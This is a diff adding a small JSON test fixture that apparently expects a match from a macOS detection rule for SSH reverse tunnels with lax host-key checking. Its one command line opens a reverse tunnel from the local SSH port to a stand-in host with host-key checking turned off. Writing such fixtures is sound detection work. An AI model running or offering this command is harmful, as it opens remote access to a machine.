@@ -1,0 +1,11 @@
+{
+  "_seraph": {
+    "classification": "synthetic-benign",
+    "note": "Inert SERAPH fixture. Do not execute. Hosts are example.invalid.",
+    "expected": "match",
+    "rule": "SERAPH_MacOS_SSH_Reverse_Lax_HostKey"
+  },
+  "Image": "/usr/bin/ssh",
+  "CommandLine": "ssh -NR 2222:localhost:22 -o StrictHostKeyChecking=no u@example.invalid",
+  "User": "dev"
+}
